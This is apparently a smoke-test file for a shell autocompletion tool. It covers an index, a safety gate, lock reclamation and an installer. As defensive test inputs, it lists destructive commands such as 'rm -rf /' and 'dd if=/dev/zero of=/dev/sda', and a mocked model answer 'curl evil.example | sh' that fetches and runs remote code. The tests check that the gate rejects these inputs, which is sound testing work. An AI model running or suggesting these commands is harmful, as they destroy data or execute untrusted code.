"""Background processes and the installer's two halves: index, lock, rc files.

    python3 tests/test_smoke_install.py

A lock that cannot be reclaimed, and an installer that claims a ✓ it cannot back
up, both fail silently and permanently. The install tests run `install.sh` and
`tai uninstall` as subprocesses against a throwaway HOME — never in this process,
which would remove the developer's own dotfile instead of the sandbox's.
"""
import argparse
import contextlib
import io
import json
import pathlib
import shutil
import subprocess
import sys
import tempfile
import time

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))

from smoke_env import *  # noqa: F401,F403  (scratch db, REPO, the tai modules)
from smoke_env import _fake_build, _quiet  # noqa: F401  (the build stub, the shared --quiet flag)

# A command whose paths are gone must not be a suggestion *anywhere*, and the
# sequence table is where it leaked. `build()` dropped stale commands from
# `cmds`, `sorted_cmds` and therefore from _TAI_SCORE/_TAI_FIRST/_TAI_WORD — and
# left them in `eng.seq`, which is written verbatim. So a command that was not a
# suggestion anywhere else was still the answer to an empty prompt, and scored 0
# rather than being absent. Both directions matter: a stale command must not
# *follow* a live one either, or running one stale command suggests the next.
_seq_db = f"/tmp/tai/tai_seq_{os.getpid()}.db"
_seq_index = f"/tmp/tai/tai_seq_{os.getpid()}_zsh.zsh"
_saved_db, _saved_index = os.environ.get("TAI_DB"), os.environ.get("TAI_INDEX")
os.environ["TAI_DB"], os.environ["TAI_INDEX"] = _seq_db, _seq_index
try:
    # A store the previous run of this test left behind would still hold the
    # rows, so every recorded command would already exist and the sequence
    # table would be built from the leftovers rather than from what is written
    # here. Removing it first is what makes the test repeatable.
    for _p in (_seq_db, _seq_db + "-wal", _seq_db + "-shm", _seq_index):
        pathlib.Path(_p).unlink(missing_ok=True)
    _STALE = "cd /nowhere/gone-abc"          # judged MISSING on its own evidence
    # Five commands in a chain, so that filtering the stale one leaves live
    # successors behind. Three chained through the stale command is not enough:
    # every key but one empties out, and a test that asserts "the sequence table
    # is not empty" then fails for a reason that has nothing to do with the leak.
    _CHAIN = ["git checkout feature", _STALE, "git status", "ls -la", "echo hi"]
    _LIVE_BEFORE = "git checkout feature"
    _LIVE_AFTER = "git status"
    # Recorded with a real cwd and *not* purged first, because that is the shape
    # the leak needs: the row is in the store, so the engine learns it, and
    # `build` is what has to decide it is not a suggestion. Purging it away
    # beforehand would make the test pass against the unfixed builder too — it
    # would be testing the purge, not the index.
    for _c in _CHAIN:
        tai_store.append_and_count(_c, cwd=REPO)
    from tai.index import build as _build
    _build()
    _written = pathlib.Path(_seq_index).read_text()
    _seq_lines = [_l for _l in _written.splitlines() if _l.startswith("_TAI_SEQ")]
    assert _seq_lines, "no _TAI_SEQ entries at all: the fixture proved nothing"
    assert not any(_STALE in _l for _l in _seq_lines), \
        f"a stale command is still offered as what follows another one: {_seq_lines}"
    assert not any(_l.startswith("_TAI_SEQ+=('" + _STALE) for _l in _seq_lines), \
        f"a stale command still has followers in the index: {_seq_lines}"
    # The live commands are untouched, so this is a filter and not a purge.
    assert any(_LIVE_AFTER in _l for _l in _seq_lines), \
        f"filtering the sequence table also removed live commands: {_seq_lines}"
finally:
    os.environ["TAI_DB"], os.environ["TAI_INDEX"] = _saved_db, _saved_index
    for _p in (_seq_db, _seq_db + "-wal", _seq_db + "-shm", _seq_index):
        pathlib.Path(_p).unlink(missing_ok=True)
print("OK — a stale command is not a suggestion anywhere, the sequence table included.")

# Which files an import reads, and the trap that emptied it. zsh and bash both set
# HISTFILE as a shell parameter and neither exports it, so a tai subprocess cannot
# see it: the plugin has to say so, and until it does, a machine keeping its
# history in a non-default file contributes nothing at all. Measured on the machine
# this was reported from — 441 commands, all from `~/.bash_history`, and
# `~/.zhistory` absent from the import table.
from tai.store import _history_files

custom = pathlib.Path("/tmp/tai/tai_custom.history")
custom.write_text("nano .zshrc\n")
home = pathlib.Path(os.path.expanduser("~"))
try:
    os.environ["TAI_HISTORY_FILES"] = str(custom)
    got = _history_files(home)
    # Added, not substituted: a user with both zsh and bash keeps two history
    # files, and dropping one because the other was named would lose half the
    # history. `TAI_HISTORY_FILES` is documented as *extra* files for that reason.
    assert custom in got, got
    assert home / ".zsh_history" in got and home / ".bash_history" in got, got
finally:
    del os.environ["TAI_HISTORY_FILES"]
assert custom not in _history_files(home), "and not read when unset"
print("OK — the shell's own history file is read, not a guess.")

# Safety is decided in code, not by the model. A hosted model answering
# `{"choice": "rm -rf /", "destructive": 0.1}` must not reach the prompt, and
# neither must a choice that is just the prefix echoed back.
import tai.jev as tai_jev
from tai.decisions import unsafe_score
from tai.jev import JevResult

for destructive in ("rm -rf /", "git reset --hard HEAD~5", "terraform destroy",
                    "dd if=/dev/zero of=/dev/sda", "shutdown 0", "kill -9 1"):
    assert unsafe_score(destructive) == 1.0, destructive
# …and the *spellings* of the same commands. The gate knew `rm -rf` and not
# `rm -fr` — the same command with the flags the other way round, which is how it
# gets written when the force is what the person had in mind — nor the long forms
# that read as safer and are not. A gate that covers one spelling of an intent is
# a gate with a hole shaped like that spelling.
for destructive in ("rm -fr build", "rm -r build", "rm -r -f x",
                    "rm --recursive --force x", "rm --no-preserve-root -rf /",
                    "kill 1234", "killall node", "docker system prune -af",
                    "docker volume prune", "docker rm -f web"):
    assert unsafe_score(destructive) == 1.0, destructive
# The other direction is where the cost is, so these are the ones that must not
# become 1.0: an ordinary command with a destructive-looking flag somewhere in it.
for harmless in ("rm -i file", "rm -d dir", "rmdir emptydir", "rm --help",
                 "grep -r pattern .", "git reset --soft HEAD~1", "git clean -n",
                 "docker ps", "docker run --rm -it ubuntu", "docker image ls",
                 "terraform plan", "kubectl get pods", "helm list",
                 "npm run build", "cargo test", "ps aux | grep rm"):
    assert unsafe_score(harmless) == 0.0, harmless
# A false positive here is *not* a bug, and tightening it would be the mistake:
# `echo 'rm -rf /'` prints text. All the gate costs is that the line is not
# offered; the person who typed it can still run it.
assert unsafe_score("echo 'rm -rf /'") == 1.0
for harmless in ("ls -la", "git status", "docker compose up -d", "rm file.txt"):
    assert unsafe_score(harmless) == 0.0, harmless

real_jev_decide = tai_jev.decide


def _ask(prefix, choice, destructive=0.1, show=0.9):
    tai_jev.decide = lambda *a, **k: JevResult(choice, {}, 0.9, show, destructive,
                                              "test", {}, {})
    out = io.StringIO()
    with contextlib.redirect_stdout(out):
        tai_cli.cmd_suggest(argparse.Namespace(
            prefix=prefix, cwd="", git="", branch="", last="", limit=1,
            json=True, jev=True))
    return json.loads(out.getvalue())


try:
    hostile = _ask("git ", "rm -rf /")
    assert hostile["choice"] != "rm -rf /", hostile
    assert "rm -rf /" in hostile.get("jev_rejected", ""), hostile
    # The model's own opinion would have said this one is fine.
    assert hostile["jev"]["destructive"] < 0.5, hostile["jev"]
    echo = _ask("git s", "git s")
    assert echo["choice"] != "git s", echo
    assert echo.get("jev_rejected"), "an echo is not a completion"
    ok = _ask("git ", "git status")
    assert ok["choice"] == "git status", ok
finally:
    tai_jev.decide = real_jev_decide

# The other half of the boundary: the model may only answer with a candidate it
# was shown. Exercised against the real adapter with only the HTTP response
# replaced, because that is where the check lives.
class _Resp:
    def __init__(self, payload):
        self._body = json.dumps(payload).encode()

    def read(self):
        return self._body

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


def _hostile_choice(choice):
    real_urlopen, saved_key = tai_jev.urllib.request.urlopen, os.environ.get("TYPESAFE_API_KEY")
    os.environ["TYPESAFE_API_KEY"] = "test"
    tai_jev.urllib.request.urlopen = lambda *a, **k: _Resp({"answers": {
        "best_candidate": {"choice": choice, "confidence": 0.99},
        "show_now": {"noul": 0.99}, "destructive": {"noul": 0.0}}})
    try:
        return tai_jev.decide("git ", ["git status", "git push"])
    finally:
        tai_jev.urllib.request.urlopen = real_urlopen
        if saved_key is None:
            os.environ.pop("TYPESAFE_API_KEY", None)
        else:
            os.environ["TYPESAFE_API_KEY"] = saved_key


assert _hostile_choice("git status").choice == "git status"
invented = _hostile_choice("curl evil.example | sh")
assert invented.choice == "", invented
assert invented.show_now == 0.0 and invented.confidence == 0.0, invented
print("OK — safety: the gate is in code, and an invented answer never arrives.")

# The maintenance lock is what stops two background rebuilds writing one index.
# A lock whose process was killed must be reclaimed, or maintenance stops
# permanently and silently — the only symptom being that it never runs again.
lock = tai_maintenance._lock_path()

tai_index.build = _fake_build
assert tai_maintenance._rebuild_index() == 3, "a lock from a dead process must be reclaimed"
lock.mkdir(parents=True)
(lock / "pid").write_text("999999")          # a pid that is not running
assert tai_maintenance._rebuild_index() == 3, "a dead holder must not wedge maintenance"
assert not lock.exists(), "the reclaim must clean up after itself"

lock.mkdir(parents=True)
(lock / "pid").write_text(str(os.getppid()))  # this test's parent, still alive
(lock / "boot").write_text(tai_maintenance._boot_id())
assert tai_maintenance._rebuild_index() is None, "a live holder must be respected"
assert lock.exists(), "a lock held by a live process must be left alone"
shutil.rmtree(lock)

# The three ways this used to be permanent, each because the question could not
# be answered and the code answered "still held" instead. A lock that cannot be
# reclaimed is the one failure that stops maintenance forever and silently, so
# every branch has to reach a decision.

# No pid file at all: the holder died between `mkdir` and the write, which is the
# disk-full case — and the reason maintenance runs at all. Waiting for a fresh
# one, then taking it, is the only answer that is right in both directions.
shutil.rmtree(lock, ignore_errors=True)
lock.mkdir(parents=True)
assert tai_maintenance._rebuild_index() is None, "a lock being written right now is respected"
old = time.time() - tai_maintenance.LOCK_STALE_SECONDS - 60
os.utime(lock, (old, old))
assert tai_maintenance._rebuild_index() == 3, "a pidless lock must not wedge maintenance forever"
assert not lock.exists()

# A pid that is alive because the machine rebooted and the number was reused.
# The boot id is what tells those apart, and without it this never recovers.
lock.mkdir(parents=True)
(lock / "pid").write_text(str(os.getppid()))
(lock / "boot").write_text("an-id-from-before-the-last-reboot")
assert tai_maintenance._rebuild_index() == 3, "a lock from a previous boot must be reclaimed"

# And a lock this test's own process left behind, which is what a crashed run
# looks like. A live process must never take a lock from a live holder, so the
# staleness is what makes this recoverable rather than instant.
lock.mkdir(parents=True)
(lock / "pid").write_text(str(os.getpid()))
(lock / "boot").write_text(tai_maintenance._boot_id())
os.utime(lock, (old, old))
assert tai_maintenance._rebuild_index() == 3, "a stale lock from our own pid must be reclaimed"
tai_index.build = real_build
print("OK — the maintenance lock: respected while live, reclaimed when dead.")

# `tai update` is the whole upgrade path, so the ways it can be wrong have to be
# answered rather than crashed on. A checkout that is not a git repo cannot be
# pulled, and the only honest thing to say is where to get a real one.
real_repo_dir = tai_cli._repo_dir
with tempfile.TemporaryDirectory() as not_a_repo:
    tai_cli._repo_dir = lambda: pathlib.Path(not_a_repo)
    out = io.StringIO()
    try:
        with contextlib.redirect_stdout(out):
            code = tai_cli.cmd_update(_quiet(False))
    finally:
        tai_cli._repo_dir = real_repo_dir
assert code == 1, code
assert tai_cli.REPO_URL in out.getvalue(), out.getvalue()

# And on a real install it finds its own checkout, so the user never has to
# remember which folder the project lives in.
assert tai_cli._repo_dir() == pathlib.Path(REPO).resolve(), tai_cli._repo_dir()
assert (tai_cli._repo_dir() / ".git").is_dir(), "the checkout must be a git repo"
print("OK — update: finds its own checkout, explains a non-git one.")

# The installer's own output is the first thing a new user reads, and it answers
# one question: is tai live in my shell now. Two shells, one line each, and the
# one command that makes the shell they are sitting in pick them up. This runs
# against a throwaway HOME, because install.sh is the one script that edits a
# user's rc files.
import subprocess


def _install_env(home: str) -> dict:
    # HOME and the index paths are redirected together; HISTFILE is cleared
    # because an exported one would import the developer's real history into the
    # sandboxed database, which is slow and asserts nothing.
    return dict(os.environ, HOME=home, XDG_DATA_HOME=f"{home}/share",
                BIN_DIR=f"{home}/bin", TAI_DB=f"{home}/history.db",
                TAI_INDEX=f"{home}/zsh-index.zsh", HISTFILE="",
                TAI_HISTORY_FILES="")


def _install(home: str) -> subprocess.CompletedProcess:
    return subprocess.run(["bash", f"{REPO}/install.sh"], env=_install_env(home),
                          capture_output=True, text=True, timeout=120)


with tempfile.TemporaryDirectory() as fake_home:
    done = _install(fake_home)
    assert done.returncode == 0, done.stderr
    lines = [line for line in done.stdout.splitlines() if line.strip()]
    # One progress line while history is imported, then the whole report. The
    # parent of install.sh here is this test, so the reload line is the generic
    # one — the same output a user in fish, or in a terminal multiplexer, gets.
    assert lines[1:] == ["✓ zsh installed", "✓ bash installed", "→ exec $SHELL"], lines
    assert done.stderr == "", done.stderr
    # A ✓ is a claim about an rc file, so it has to be true.
    for rc, plugin in ((".zshrc", "tai.zsh"), (".bashrc", "tai.bash")):
        source_lines = [l for l in (pathlib.Path(fake_home) / rc).read_text().splitlines()
                        if "source" in l and "plugins/" in l]
        assert len(source_lines) == 1 and f"plugins/{plugin}" in source_lines[0], (rc, source_lines)

    # The wrapper is what a user runs when something is wrong, so it has to be
    # able to say what. Its checkout is the one the installer ran from and the
    # only copy, so moving or deleting that folder leaves it pointing at nothing
    # — and what python says for that ("can't open file …: [Errno 2]") is not
    # something a person can act on. The wrapper the installer just wrote is
    # exercised as written, with the path it names moved away; a wrapper written
    # here instead would only be testing a copy of it.
    wrapper = pathlib.Path(_install_env(fake_home)["BIN_DIR"]) / "tai"
    assert wrapper.exists(), "the installer did not write a wrapper"
    working = subprocess.run([str(wrapper), "suggest", "git st"],
                             env=_install_env(fake_home),
                             capture_output=True, text=True, timeout=120)
    assert working.returncode == 0 and working.stdout.strip(), working.stderr
    text = wrapper.read_text()
    moved = f"{fake_home}/moved-away/tai/cli.py"
    # Every mention of the checkout's path, which is what "the checkout moved"
    # means to the wrapper: it checks that path and then runs it. Named by
    # shape rather than by position in the exec line, which is free to grow
    # interpreter flags (`python3 -S -E …`) without breaking this parse.
    named = [w for w in text.split() if w.endswith("/tai/cli.py")][0]
    wrapper.write_text(text.replace(named, moved))
    gone = subprocess.run([str(wrapper), "suggest", "git st"], env=_install_env(fake_home),
                          capture_output=True, text=True, timeout=120)
    assert gone.returncode == 1, gone.stdout
    assert "is gone" in gone.stderr and "reinstall" in gone.stderr, gone.stderr
    assert "Traceback" not in gone.stderr, gone.stderr
    _install(fake_home)          # put the real wrapper back for the checks below

    # An rc file that cannot be written is named, not claimed: the other shell
    # was already enabled, and the install carries on to finish it. The message
    # carries the line to add, or it names a problem without offering a fix.
    (pathlib.Path(fake_home) / ".zshrc").unlink()
    (pathlib.Path(fake_home) / ".zshrc").mkdir()
    broken = _install(fake_home)
    assert broken.returncode == 0, broken.stderr
    assert "✓ zsh installed" not in broken.stdout, broken.stdout
    assert "! zsh: could not update" in broken.stderr, broken.stderr
    assert f"source {REPO}/plugins/tai.zsh" in broken.stderr, broken.stderr
    assert "✓ bash installed" in broken.stdout, broken.stdout

    # Neither rc file writable: there is nothing to exec into, so the command to
    # copy is withheld and the exit code says the install did not land. Printing
    # it anyway would promise a live plugin that no shell is configured to load.
    (pathlib.Path(fake_home) / ".bashrc").unlink()
    (pathlib.Path(fake_home) / ".bashrc").mkdir()
    neither = _install(fake_home)
    assert neither.returncode == 1, neither.returncode
    assert "✓" not in neither.stdout, neither.stdout
    assert "→ exec" not in neither.stdout, neither.stdout
    assert "! bash: could not update" in neither.stderr, neither.stderr
print("OK — install: two lines and one command, and no ✓ it cannot back up.")

# Everything below speaks to a real zsh: the pause is install.sh editing a
# zshrc, which it only does when zsh itself is present, and the errexit checks
# source the plugin in one. A machine without zsh skips from here instead of
# failing — the rest of test.sh still runs, which is the deal test.sh offers a
# bash-only box.
if not zsh_bin():
    print("SKIP — the remaining install checks need the zsh binary; none here.")
    sys.exit(0)

# zsh-autosuggestions, which Manjaro's prompt loads for you. The installer pauses
# it and `tai uninstall` gives it back, so both halves are exercised here: a block
# added but never removed is a user's shell quietly configured differently from how
# they left it.
with tempfile.TemporaryDirectory() as fake_home:
    zshrc = pathlib.Path(fake_home) / ".zshrc"
    # A plugin file and a line that loads it, which is the shape the pause has to
    # work with: the line is in a file the user did not write, so commenting it out
    # is not available and removing its hook is.
    plugin = pathlib.Path(fake_home) / "autosuggestions.zsh"
    plugin.write_text("_zsh_autosuggest_start() { : }\n"
                      "autoload -Uz add-zsh-hook\n")
    zshrc.write_text(f"source {plugin}\n")
    env = dict(os.environ, HOME=fake_home, ZDOTDIR=fake_home,
               XDG_DATA_HOME=f"{fake_home}/share", BIN_DIR=f"{fake_home}/bin",
               TAI_DB=f"{fake_home}/history.db", TAI_INDEX=f"{fake_home}/i.zsh",
               HISTFILE="", TAI_HISTORY_FILES="", TAI_KEEP_AUTOSUGGEST="0")
    done = subprocess.run(["bash", f"{REPO}/install.sh"], env=env,
                          capture_output=True, text=True, timeout=120)
    assert done.returncode == 0, done.stderr
    text = zshrc.read_text()
    assert "# tai: zsh-autosuggestions paused" in text, text
    assert "add-zsh-hook -d precmd _zsh_autosuggest_start" in text, text
    # The user's own line is untouched: this pauses the plugin, it does not
    # rewrite someone's configuration.
    assert f"source {plugin}" in text, text
    assert "✓ zsh-autosuggestions paused" in done.stdout, done.stdout
    # Idempotent: a second install replaces the block rather than stacking copies.
    again = subprocess.run(["bash", f"{REPO}/install.sh"], env=env,
                           capture_output=True, text=True, timeout=120)
    assert again.returncode == 0, again.stderr
    assert zshrc.read_text().count("_zsh_autosuggest_start") == 1, zshrc.read_text()
    # And the opt-out is honoured, because a user who wants both plugins keeps
    # both: the line is only ever a suggestion about which hint you see.
    keep = dict(env, TAI_KEEP_AUTOSUGGEST="1")
    subprocess.run(["bash", f"{REPO}/install.sh"], env=keep,
                   capture_output=True, text=True, timeout=120)
    kept_text = zshrc.read_text()
    assert "add-zsh-hook -d precmd _zsh_autosuggest_start" not in kept_text, kept_text

    # Uninstall gives the plugin back, and leaves the user's own line alone.
    # Run as a subprocess with the same redirects as the installer, and never by
    # calling `cmd_uninstall` in this process: that reads HOME, XDG_DATA_HOME and
    # TAI_DATA_DIR out of *this* environment, so an in-process call removes the
    # developer's own database, indexes and dotfile rather than the sandbox's.
    tai_env = dict(env, TAI_DATA_DIR=f"{fake_home}/share/tai")
    uninstalled = subprocess.run(
        ["python3", f"{REPO}/tai/cli.py", "uninstall"], env=tai_env,
        capture_output=True, text=True, timeout=60)
    assert uninstalled.returncode == 0, uninstalled.stderr
    after = zshrc.read_text()
    assert "autosuggestions paused" not in after, after
    assert "_zsh_autosuggest_start" not in after, after
    assert f"source {plugin}" in after, after
    assert "plugins/tai.zsh" not in after, after
    assert not pathlib.Path(tai_env["TAI_DATA_DIR"]).exists(), "the data went too"
print("OK — install pauses zsh-autosuggestions, uninstall gives it back.")

# The plugin is a guest in the user's rc file, so it must survive — and not
# damage — a shell that has `set -e` before it. It did not survive: the load
# called zsh's own `add-zle-hook-widget`, whose internal `(( del ))` returns
# false on a shell with no such hook yet, and errexit ended the *session* on the
# last line of a file the user never edited. `plugins/tai.zsh` suspends errexit
# for the load and restores it.
#
# Three things to assert, and the third is the one that would be easy to get
# wrong: a guard that quietly leaves `set -e` off afterwards would be a worse bug
# than the one it prevents. Real shells, the real index, and the real plugin.
_errexit_home = f"{fake_home}/errexit"
os.makedirs(_errexit_home, exist_ok=True)
_errexit_env = dict(env, HOME=_errexit_home, TAI_INDEX=f"{_errexit_home}/zsh-index.zsh",
                    TAI_HISTORY_FILES="")
assert tai_index.build() > 0, "nothing to load"
_loaded = subprocess.run(
    ["zsh", "-f", "-c", f"set -e; source {REPO}/plugins/tai.zsh; print REACHED-END"],
    env=_errexit_env, capture_output=True, text=True, timeout=60)
assert "REACHED-END" in _loaded.stdout, f"set -e killed the shell: {_loaded.stderr}"
_still_on = subprocess.run(
    ["zsh", "-f", "-c", f"set -e; source {REPO}/plugins/tai.zsh; false; print LEAKED"],
    env=_errexit_env, capture_output=True, text=True, timeout=60)
assert "LEAKED" not in _still_on.stdout, "the plugin left errexit off in the user's shell"
_plain = subprocess.run(["zsh", "-f", "-c", f"source {REPO}/plugins/tai.zsh; print REACHED-END"],
                        env=_errexit_env, capture_output=True, text=True, timeout=60)
assert "REACHED-END" in _plain.stdout and _plain.stderr == "", _plain.stderr
print("OK — a shell with `set -e` loads the plugin and keeps its own setting.")
